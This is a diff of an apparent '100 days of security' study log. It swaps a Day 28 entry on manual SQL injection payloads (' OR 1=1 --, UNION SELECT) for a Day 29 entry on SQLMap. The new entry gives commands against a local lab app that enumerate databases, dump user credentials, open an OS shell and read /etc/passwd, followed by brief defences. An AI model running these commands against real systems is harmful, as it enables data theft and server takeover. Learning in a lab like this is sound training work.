@@ -1,28 +1,27 @@
-## 🗓️ Day 28/100 – SQL Injection (SQLi)
+## 🗓️ Day 29/100 – SQLMap: Automated SQL Injection Toolkit
 
-**Focus:** Exploiting improper input validation to manipulate database queries.
+**Focus:** Transition from manual SQLi to automated exploitation.
 
-### 💉 What is SQL Injection?
-SQLi is a vulnerability where an application takes user input and inserts it directly into a database query. This allows an attacker to interfere with the queries the application makes to its database.
+### ⚡ SQLMap Capabilities Demonstrated
 
-### ⚔️ Attack Vectors Explored
+**1. Target Discovery & Injection Detection**
+```bash
+sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&username=admin" --batch
 
-**1. Authentication Bypass**
-*   **Scenario:** Login form vulnerable to SQLi.
-*   **Payload:** `' OR 1=1 --`
-*   **Result:** The query becomes `SELECT * FROM users WHERE user = '' OR 1=1 --'` which is always TRUE, logging the attacker in as the first user (usually Admin).
+2. Database Enumeration# List all databases
+sqlmap -u "target" --dbs
 
-**2. UNION-Based SQLi**
-*   **Scenario:** Retrieving data from other tables.
-*   **Payload:** `' UNION SELECT username, password FROM users --`
-*   **Result:** The application displays results from the `users` table mixed with the original query results.
+# List tables in specific database
+sqlmap -u "target" -D juice_shop --tables
 
-**3. Blind SQLi**
-*   **Scenario:** No visible output, but the application behaves differently (e.g., page load delay).
-*   **Technique:** Inferring data character by character based on True/False responses.
+# List columns in specific table
+sqlmap -u "target" -D juice_shop -T users --columns3. Data Exfiltration# Dump entire table
+sqlmap -u "target" -D juice_shop -T users --dump
 
-### 🛡️ Defense Mechanism
-*   **Primary Fix:** Use **Prepared Statements (Parameterized Queries)**.
-*   **Secondary:** Input Validation (Allow-listing) and Least Privilege Principle for DB accounts.
+# Dump specific columns
+sqlmap -u "target" -D juice_shop -T users -C "email,password" --dump4. Advanced Exploitation# OS command execution
+sqlmap -u "target" --os-shell
 
-**Day 28 Takeaway:** SQLi is preventable, yet it remains a leading cause of data breaches due to legacy code and lack of secure coding practices.
+# File system access
+sqlmap -u "target" --file-read="/etc/passwd"🧠 Attack Speed ComparisonManual SQLi:    2-4 hours per vulnerable endpoint
+SQLMap:         2-5 minutes per vulnerable endpoint🔒 Defensive TakeawaysParameterized Queries render SQLMap ineffectiveWAF Detection (signature-based) often bypassed by SQLMap's evasion techniquesDatabase Least Privilege limits damage even when exploited
